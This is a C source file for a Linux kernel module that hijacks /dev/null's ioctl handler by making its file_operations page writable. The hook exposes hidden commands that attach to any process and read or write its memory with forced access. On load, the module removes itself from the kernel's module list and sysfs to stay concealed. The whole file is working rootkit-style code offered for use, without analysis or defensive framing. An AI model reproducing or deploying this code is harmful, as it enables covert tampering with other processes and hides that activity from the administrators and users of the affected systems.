/*
    Advanced: Hijack existing device's IOCTL handler
    No new /dev entry created
*/

#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "kmd.h"

MODULE_LICENSE("GPL");

// /dev/null doesn't normally handle ioctls, so we can add our own

static struct file_operations *null_fops = NULL;
static long (*original_null_ioctl)(struct file *, unsigned int,
                                   unsigned long) = NULL;

static struct task_struct *target_task = NULL;
static struct pid *target_pid_struct = NULL;

#define HIDDEN_MAGIC 0xDE
#define HIDDEN_ATTACH _IOW(HIDDEN_MAGIC, 0x01, struct kmd_attach_request)
#define HIDDEN_READ _IOWR(HIDDEN_MAGIC, 0x02, struct kmd_copy_request)
#define HIDDEN_WRITE _IOW(HIDDEN_MAGIC, 0x03, struct kmd_copy_request)

static long hooked_null_ioctl(struct file *file, unsigned int cmd,
                              unsigned long arg) {
  // Check if it's our command
  if (_IOC_TYPE(cmd) != HIDDEN_MAGIC) {
    // Not ours, call original (if any) or return error
    if (original_null_ioctl)
      return original_null_ioctl(file, cmd, arg);
    return -ENOTTY;
  }

  // Handle our hidden IOCTLs
  switch (cmd) {
  case HIDDEN_ATTACH: {
    struct kmd_attach_request req;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
      return -EFAULT;

    if (target_pid_struct) {
      put_pid(target_pid_struct);
      target_pid_struct = NULL;
      target_task = NULL;
    }

    target_pid_struct = find_get_pid(req.pid);
    if (!target_pid_struct)
      return -ESRCH;

    rcu_read_lock();
    target_task = pid_task(target_pid_struct, PIDTYPE_PID);
    rcu_read_unlock();

    if (!target_task) {
      put_pid(target_pid_struct);
      target_pid_struct = NULL;
      return -ESRCH;
    }
    return 0;
  }

  case HIDDEN_READ: {
    struct kmd_copy_request req;
    struct mm_struct *mm;
    void *kbuf;
    int bytes;

    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
      return -EFAULT;

    if (!target_task || req.size > 4096)
      return -EINVAL;

    kbuf = kmalloc(req.size, GFP_KERNEL);
    if (!kbuf)
      return -ENOMEM;

    mm = get_task_mm(target_task);
    if (!mm) {
      kfree(kbuf);
      return -EINVAL;
    }

    bytes =
        access_process_vm(target_task, req.from, kbuf, req.size, FOLL_FORCE);
    mmput(mm);

    if (bytes != req.size) {
      kfree(kbuf);
      return -EIO;
    }

    if (copy_to_user((void __user *)req.to, kbuf, req.size)) {
      kfree(kbuf);
      return -EFAULT;
    }

    kfree(kbuf);
    return 0;
  }

  case HIDDEN_WRITE: {
    struct kmd_copy_request req;
    struct mm_struct *mm;
    void *kbuf;
    int bytes;

    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
      return -EFAULT;

    if (!target_task || req.size > 4096)
      return -EINVAL;

    kbuf = kmalloc(req.size, GFP_KERNEL);
    if (!kbuf)
      return -ENOMEM;

    if (copy_from_user(kbuf, (void __user *)req.to, req.size)) {
      kfree(kbuf);
      return -EFAULT;
    }

    mm = get_task_mm(target_task);
    if (!mm) {
      kfree(kbuf);
      return -EINVAL;
    }

    bytes = access_process_vm(target_task, req.from, kbuf, req.size,
                              FOLL_FORCE | FOLL_WRITE);
    mmput(mm);
    kfree(kbuf);

    return (bytes == req.size) ? 0 : -EIO;
  }

  default:
    return -ENOTTY;
  }
}

// Make page writable to modify fops
static void make_rw(void *addr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)addr, &level);
  if (pte->pte & ~_PAGE_RW)
    pte->pte |= _PAGE_RW;
}

static void make_ro(void *addr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)addr, &level);
  pte->pte &= ~_PAGE_RW;
}

static int __init hijack_init(void) {
  struct file *null_file;

  // Open /dev/null to get its file_operations
  null_file = filp_open("/dev/null", O_RDWR, 0);
  if (IS_ERR(null_file)) {
    pr_err("Failed to open /dev/null\n");
    return PTR_ERR(null_file);
  }

  null_fops = (struct file_operations *)null_file->f_op;
  filp_close(null_file, NULL);

  // Save original ioctl handler
  original_null_ioctl = null_fops->unlocked_ioctl;

  // Make fops writable and install our hook
  make_rw(null_fops);
  null_fops->unlocked_ioctl = hooked_null_ioctl;
  make_ro(null_fops);

  pr_info("Hijack installed on /dev/null\n");

  // Hide ourselves
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);

  return 0;
}

static void __exit hijack_exit(void) {
  // Restore original handler
  if (null_fops) {
    make_rw(null_fops);
    null_fops->unlocked_ioctl = original_null_ioctl;
    make_ro(null_fops);
  }

  if (target_pid_struct)
    put_pid(target_pid_struct);

  pr_info("Hijack removed\n");
}

module_init(hijack_init);
module_exit(hijack_exit);
